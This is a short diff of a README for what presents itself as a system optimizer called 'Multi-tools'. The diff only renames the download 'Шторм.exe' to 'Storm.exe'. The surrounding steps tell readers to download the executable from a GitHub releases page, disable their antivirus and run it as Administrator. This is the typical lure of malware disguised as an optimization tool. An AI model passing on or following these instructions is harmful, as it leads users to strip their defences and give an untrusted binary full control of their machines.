@@ -32,7 +32,7 @@ To ensure the optimizer can modify system registry keys and remove deep-seated b
 
 ### 📥 Installation & Setup
 1. Go to the **[Releases](https://github.com/ASXCCFTYHNNJI/Multi-tools/releases)** section on the right side of this page.
-2. Download the `Шторм.exe` file.
+2. Download the `Storm.exe` file.
 3. **Disable your Antivirus** to allow the optimization scripts to run.
 4. Run the executable as **Administrator** to unlock the full potential of the suite.
 
